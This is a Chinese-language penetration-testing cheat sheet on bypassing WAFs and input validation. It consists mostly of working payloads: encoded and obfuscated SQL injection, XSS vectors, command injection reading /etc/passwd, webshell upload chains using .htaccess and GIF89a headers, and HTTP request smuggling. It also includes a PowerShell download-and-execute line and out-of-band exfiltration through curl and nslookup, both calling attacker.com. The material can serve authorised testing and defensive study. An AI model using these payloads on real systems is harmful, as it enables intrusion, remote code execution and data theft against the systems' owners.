# 常见绕过技术

## 技术概述
在渗透测试过程中，安全防护机制（WAF、IPS、IDS、输入验证、认证系统等）会对恶意请求进行检测和拦截。了解这些绕过技术有助于全面评估系统的防御能力，并为 POC 生成提供参考。

核心绕过思路：
- **规范化差异**：利用不同组件对同一输入的不同解析结果
- **语义等价**：用不同的语法表达相同的攻击语义
- **协议特性**：利用 HTTP 协议的边缘行为和实现差异
- **上下文切换**：在不同处理上下文之间传递 payload 以避开检测
- **资源限制**：利用 WAF 的性能限制（超长输入、嵌套深度）

## 编码方法

### 1. URL 编码系列
```
单层编码: ' → %27, < → %3C, > → %3E
双层编码: ' → %2527, < → %253C
三层编码: ' → %252527

部分编码: %27OR 1=1--  (仅编码关键字符)
Unicode URL: %u0027, %u003c, %u003e  (IIS/ASP 特有)
UTF-8 URL: %c0%27, %e0%80%a7  (超长 UTF-8 编码)
```

### 2. Base 编码系列
```
Base64:    YWxlcnQoMSk=         (alert(1))
Base64URL: YWxlcnQoMSk         (无填充 =)
Base32:    MVQHS33OEU======     (alert(1))
Base16/Hex: 616c657274283129   (alert(1))
Base58:    2NEpo7TZzHrXx      (alert(1))
```

### 3. HTML 实体编码
```
十进制:  &#60;script&#62;alert(1)&#60;/script&#62;
十六进制: &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
命名实体: &lt;script&gt;alert(1)&lt;/script&gt;
混合实体: &lt;script&gt;aler&#x74;(1)&lt;/script&gt;
```

### 4. JavaScript 编码
```
Unicode 转义: \u0061\u006c\u0065\u0072\u0074(1)
十六进制转义: \x61\x6c\x65\x72\x74(1)
八进制转义: \141\154\145\162\164(1)
CSS 转义: \61\6C\65\72\74(1)
String.fromCharCode: String.fromCharCode(97,108,101,114,116,40,49,41)
eval(atob()): eval(atob('YWxlcnQoMSk='))
```

### 5. SQL 编码
```
十六进制字符串: 'admin' → 0x61646d696e
CHAR 函数: 'admin' → CHAR(97,100,109,105,110)
NCHAR 函数: N'a'+'d'+'min'
Unicode SQL: N'select' (SQL Server)
字符串拼接: 'ad'+'min', CONCAT('ad','min')
REVERSE: REVERSE('nimda') → 'admin'
```

### 6. PowerShell 编码
```
Base64: powershell -enc YQBsAGUAcgB0ACgAMQApAA==
字符串拼接: $a='al';$b='ert';iex "$a$b(1)"
反引号: a`l`e`r`t(1)
Invoke-Expression: iex (New-Object Net.WebClient).DownloadString('http://attacker.com/payload')
```

## 混淆技巧

### 1. 空白符混淆
```
SQL: UNION%09SELECT, UNION/**/SELECT, UNION%0CSELECT
命令: cat${IFS}/etc/passwd, cat$IFS$9/etc/passwd
JavaScript: alert  (  1  )  (多余空格)
```

### 2. 大小写混淆
```
SQL: SeLeCt, FrOm, WhErE, UnIoN
命令: CaT, WhOaMi, /BiN/BaSh
HTML: <ScRiPt>, <ImG>, <OnErRoR>
JavaScript: AlErT(1), DOCument.COoKiE
```

### 3. 注释混淆
```sql
-- MySQL 内联注释
/*!SELECT*/ /*!12345UNION*/ /*!50000SELECT*/

-- 行内注释分割
SEL/**/ECT col FR/**/OM table
SEL/*foo*/ECT 1 FR/*bar*/OM dual

-- 多行注释
SELECT/*
*/1/*
*/FROM/*
*/dual
```

### 4. 字符串混淆
```javascript
// JavaScript
"alert(1)"
'a'+'l'+'e'+'r'+'t(1)'
String.fromCharCode(97,108,101,114,116,40,49,41)
atob('YWxlcnQoMSk=')
window['al'+'ert'](1)
self['ale'+'rt'](1)
```

```python
# Python
"alert(1)"
'al'+'ert(1)'
getattr(__builtins__, 'eval')('alert(1)')
__import__('os').system('id')
```

### 5. 命令混淆
```bash
# Bash
cat /etc/passwd
c""at /etc/passwd
c\at /etc/passwd
$(printf '\x63\x61\x74') /etc/passwd
$(echo -e "\x63\x61\x74") /etc/passwd
{cat,/etc/passwd}
eval "cat /etc/passwd"
```

### 6. 代码混淆（通用）
```javascript
// 利用非标准属性访问
window["al"+"ert"](1)
self["ale"+"rt"](1)
this["ale"+"rt"](1)
top["al"+"ert"](1)
parent["al"+"ert"](1)
frames["al"+"ert"](1)

// 利用 toString/valueOf
(1).constructor.constructor("alert(1)")()
[]["constructor"]["constructor"]("alert(1)")()

// 利用箭头函数
setTimeout("alert(1)", 0)
setInterval("alert(1)", 0)
```

## WAF 绕过策略

### 1. SQL 注入 WAF 绕过
| 绕过技术 | Payload 示例 | 适用场景 |
|---------|-------------|---------|
| 内联注释 (MySQL) | `/*!UNION SELECT*/` | ModSecurity, 通用 WAF |
| 换行分割 | `UNION\nSELECT` | 基于行匹配的 WAF |
| 空白符变体 | `UNION%0CSELECT` | 空格过滤严格 |
| 双写绕过 | `UNIUNIONON SELECT` | 简单替换型 WAF |
| 编码绕过 | `%27%20OR%201%3D1` | 不解码检测的 WAF |
| 等价函数 | `MID()` 替代 `SUBSTRING()` | 关键词黑名单 |
| 逻辑重构 | `1 BETWEEN 1 AND 1` 替代 `1=1` | 等号过滤 |
| HPP | `id=1&id=UNION SELECT...` | 参数合并 WAF |
| 超长输入 | 超长注释/数据使 WAF 截断 | 性能限制型 WAF |
| JSON 嵌套 | `{"data":{"sql":"UNION SELECT..."}}` | 深层嵌套不检测 |

### 2. XSS WAF 绕过
| 绕过技术 | Payload 示例 | 适用场景 |
|---------|-------------|---------|
| 事件处理器 | `<img src=x onerror=alert(1)>` | `<script>` 被过滤 |
| SVG 标签 | `<svg onload=alert(1)>` | 常规 HTML 标签过滤 |
| 特殊标签 | `<details open ontoggle=alert(1)>` | 常见标签黑名单 |
| JavaScript URI | `<a href="javascript:alert(1)">` | 标签名过滤 |
| 编码绕过 | `&#x3c;svg onload=alert(1)&#x3e;` | 字符直接匹配 |
| 反引号 | `<svg/onload=alert\`1\`>` | 括号被过滤 |
| data URI | `<iframe src="data:text/html;base64,...">` | 外部资源加载 |
| 向量混淆 | `<scr<script>ipt>alert(1)</scr</script>ipt>` | 标签名过滤 |
| 属性注入 | `" onmouseover="alert(1)` | 属性值注入点 |
| CSS 表达式 | `<div style="background:url('javascript:alert(1)')">` | 旧版 IE |

### 3. 命令注入 WAF 绕过
| 绕过技术 | Payload 示例 | 适用场景 |
|---------|-------------|---------|
| 分隔符替换 | `cmd1%0Acmd2` (换行替代 `;`) | 分号过滤 |
| 变量拼接 | `A=ca;B=t;$A$B /etc/passwd` | 关键词过滤 |
| Base64 | `echo "Y2F0IC9ldGMvcGFzc3dk" \| base64 -d \| sh` | 命令关键字过滤 |
| 通配符 | `/b?n/c?t /e??/p??s?d` | 路径过滤 |
| 反斜杠 | `c\at /e\tc/pa\ssw\d` | 完整命令匹配 |
| 引号操纵 | `cat /etc/pa'ss'wd` | 字符串匹配 |
| IFS 变量 | `cat$IFS/etc/passwd` | 空格过滤 |
| 十六进制 | `$'\x63\x61\x74' /etc/passwd` | 完整命令过滤 |

### 4. 文件上传 WAF 绕过
| 绕过技术 | 方法 | 适用场景 |
|---------|------|---------|
| 双扩展名 | `shell.php.jpg` | 仅检查最后扩展名 |
| 大小写 | `shell.PHP` | Windows + 大小写不敏感 |
| 特殊后缀 | `shell.php.`, `shell.php%20` | Windows 自动去除 |
| Null 字节 | `shell.php%00.jpg` | 旧版本语言/服务器 |
| .htaccess | 上传 `.htaccess` 设置处理器 | Apache |
| 多部分边界 | 修改 `boundary` 格式 | 解析不一致 |
| Content-Type | `image/jpeg` 代替 `application/x-php` | MIME 检查 |
| GIF89a 头 | `GIF89a<?php ... ?>` | 文件头检查 |
| 超长文件名 | 超长文件名使 WAF 截断 | 性能限制 |

### 5. HTTP 协议级绕过
| 技术 | 说明 |
|------|------|
| **Transfer-Encoding: chunked** | 分块传输可能绕过 body 扫描 |
| **Content-Length 操纵** | 声明比实际更短的 Content-Length |
| **多部分表单嵌套** | 嵌套 multipart 使 WAF 解析失败 |
| **HTTP/2 特性** | HPACK 压缩、多路复用等 WAF 可能未完全支持 |
| **请求走私** | `Content-Length` 与 `Transfer-Encoding` 同时存在 |
| **路径规范化** | `/api/../admin` 不同组件规范化结果不同 |
| **Host 头操纵** | 修改 Host 影响后端路由决策 |
| **X-Forwarded-Host** | 代理头可能覆盖 Host |
| **HTTP 方法覆盖** | `X-HTTP-Method-Override: DELETE` |
| **协议降级** | 从 HTTPS 降级到 HTTP（若 WAF 仅拦截 HTTPS） |

### 6. API/WAF 特定绕过
| WAF/API Gateway | 已知绕过 |
|----------------|---------|
| **AWS WAF** | Unicode 规范化差异、嵌套 JSON |
| **Cloudflare** | HTTP/2 特性、特殊 Content-Type |
| **ModSecurity** | `%0A` 换行、内联注释、分块传输 |
| **Azure WAF** | 超长 URI、特殊字符编码 |
| **Nginx** | URI 规范化差异（`%2f` vs `/`） |
| **Kong** | 请求头覆盖、插件顺序 |
| **API Gateway** | 路径参数注入、查询字符串操纵 |

### 7. 性能/资源限制绕过
```
超长输入: 10KB+ 的 payload 可能使 WAF 超时或截断
深层嵌套: {"a":{"b":{"c":{"d":{"e":"PAYLOAD"}}}}} 深层 JSON
大量参数: 发送 1000+ 参数，WAF 可能仅检查前 N 个
特殊字符密度: 高比例的特殊字符可能触发异常处理路径
Unicode 规范化: 超长 Unicode 字符串规范化消耗资源
```

## 实际应用案例

### 案例 1: SQL 注入完整绕过链
**场景**：ModSecurity + 关键词黑名单 + 空格过滤
```
原始: ' UNION SELECT username,password FROM users --
步骤 1 (空格过滤): ' UNION/**/SELECT/**/username,password/**/FROM/**/users--
步骤 2 (关键词过滤): '/*!UNION*/%0A/*!SELECT*/%0Ausername,password%0A/*!FROM*/%0Ausers--
步骤 3 (完整绕过): '%0A/*!50000UnIoN*/%0A/*!50000SeLeCt*/%0Agroup_concat(username,0x3a,password)%0A/*!50000FrOm*/%0Ainformation_schema.columns--
```

### 案例 2: XSS 绕过 CSP + WAF
**场景**：CSP 限制 + `<script>` 过滤 + 长度限制
```
原始: <script>alert(1)</script>
步骤 1 (WAF 绕过): <img src=x onerror=alert(1)>
步骤 2 (CSP 绕过 - 若有 unsafe-inline): <script nonce="[value]">alert(1)</script>
步骤 3 (长度限制 20 字符): <svg/onload=alert(1)>
步骤 4 (综合): <sVg/oNLoaD=alert`1`>
```

### 案例 3: 文件上传完整绕过
**场景**：扩展名黑名单 + MIME 检查 + 文件头检查
```
原始: shell.php
步骤 1 (扩展名绕过): shell.php5
步骤 2 (MIME 绕过): Content-Type: image/jpeg
步骤 3 (文件头绕过): GIF89a + PHP code
步骤 4 (.htaccess 辅助): 上传 .htaccess → AddType application/x-httpd-php5 .jpg
步骤 5 (最终): 上传 shell.jpg (GIF89a + PHP) + .htaccess 使其作为 PHP 执行
```

### 案例 4: 命令注入带外验证
**场景**：命令执行结果不回显 + 关键词过滤
```
原始: ; cat /etc/passwd
步骤 1 (无回显): ; sleep 5 (时间盲注)
步骤 2 (OOB DNS): ; nslookup $(whoami).attacker.com
步骤 3 (OOB HTTP): ; curl http://attacker.com/$(hostname)
步骤 4 (绕过过滤): ; ns$(printf '\x6c')ookup $(whoami).attacker.com
步骤 5 (Base64): ; echo "bnNsb29rdXAgJCh3aG9hbWkpLmF0dGFja2VyLmNvbQ==" | base64 -d | bash
```
